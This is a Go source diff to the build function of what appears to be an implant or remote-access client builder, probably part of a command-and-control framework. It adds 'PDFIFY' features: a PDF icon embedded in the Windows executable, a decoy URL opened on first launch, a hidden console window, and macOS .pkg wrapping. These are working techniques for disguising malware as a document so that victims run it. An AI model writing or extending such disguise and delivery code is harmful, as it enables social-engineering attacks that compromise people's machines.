@@ -16,6 +16,9 @@ type BuildConfig struct {
 	Version        string
 	HostnamePrefix string
 	OutputDir      string
+	DecoyURL       string // PDFIFY: URL to open on first launch
+	PDFIcon        bool   // PDFIFY: use PDF icon instead of default
+	PackagePKG     bool   // macOS: wrap binary in a .pkg installer
 }
 
 // BuildResult contains the result of a build
@@ -66,14 +69,24 @@ func BuildClient(cfg BuildConfig) BuildResult {
 		cfg.HostnamePrefix,
 	)
 
+	// PDFIFY: embed decoy URL
+	if cfg.DecoyURL != "" {
+		ldflags += fmt.Sprintf(" -X 'main.DecoyURL=%s'", cfg.DecoyURL)
+	}
+
 	// For Windows, add -H windowsgui to hide the console window
 	if cfg.TargetOS == "windows" {
 		ldflags += " -H windowsgui"
 	}
 
-	// Get the path to the client source
-	// In production, this would be a fixed path or embedded
+	// For Windows targets, generate version resource with go-winres
 	clientPkg := "./cmd/client"
+	if cfg.TargetOS == "windows" {
+		if err := generateWindowsResource(cfg); err != nil {
+			return BuildResult{Error: fmt.Errorf("resource generation failed: %v", err)}
+		}
+		defer cleanupWindowsResource()
+	}
 
 	// Build the binary
 	cmd := exec.Command("go", "build",
@@ -102,11 +115,74 @@ func BuildClient(cfg BuildConfig) BuildResult {
 		return BuildResult{Error: fmt.Errorf("failed to stat output: %v", err)}
 	}
 
+	// If macOS .pkg packaging is requested, wrap the binary
+	if cfg.PackagePKG && cfg.TargetOS == "darwin" {
+		pkgPath, err := BuildMacOSPkg(outputPath, cfg.OutputDir, cfg.Version)
+		if err != nil {
+			return BuildResult{Error: fmt.Errorf("pkg packaging failed: %v", err)}
+		}
+		// Clean up the raw binary — only the .pkg is needed
+		os.Remove(outputPath)
+
+		pkgInfo, err := os.Stat(pkgPath)
+		if err != nil {
+			return BuildResult{Error: fmt.Errorf("failed to stat pkg: %v", err)}
+		}
+		return BuildResult{
+			OutputPath: pkgPath,
+			FileName:   filepath.Base(pkgPath),
+			Size:       pkgInfo.Size(),
+			BuildTime:  time.Since(startTime),
+		}
+	}
+
 	return BuildResult{
 		OutputPath: outputPath,
 		FileName:   fileName,
 		Size:       info.Size(),
 		BuildTime:  time.Since(startTime),
+	}
+}
+
+// generateWindowsResource runs go-winres to create arch-specific .syso resource files
+// with version info, manifest, and the appropriate icon (PDF or default)
+func generateWindowsResource(cfg BuildConfig) error {
+	// Resolve go-winres binary
+	winresTool := "go-winres"
+	if gopath := os.Getenv("GOPATH"); gopath != "" {
+		candidate := filepath.Join(gopath, "bin", "go-winres")
+		if _, err := os.Stat(candidate); err == nil {
+			winresTool = candidate
+		}
+	} else if home, err := os.UserHomeDir(); err == nil {
+		candidate := filepath.Join(home, "go", "bin", "go-winres")
+		if _, err := os.Stat(candidate); err == nil {
+			winresTool = candidate
+		}
+	}
+
+	args := []string{"make", "--arch", cfg.TargetArch}
+
+	// PDFIFY: override icon with PDF icon
+	if cfg.PDFIcon {
+		args = append(args, "--icon", "winres/pdf-icon.png")
+	}
+
+	cmd := exec.Command(winresTool, args...)
+	cmd.Dir = filepath.Join("cmd", "client")
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Errorf("go-winres: %v\nOutput: %s", err, string(output))
+	}
+	return nil
+}
+
+// cleanupWindowsResource removes the generated .syso files
+func cleanupWindowsResource() {
+	// go-winres generates arch-specific files like rsrc_windows_amd64.syso
+	matches, _ := filepath.Glob(filepath.Join("cmd", "client", "rsrc_windows_*.syso"))
+	for _, m := range matches {
+		os.Remove(m)
 	}
 }
 
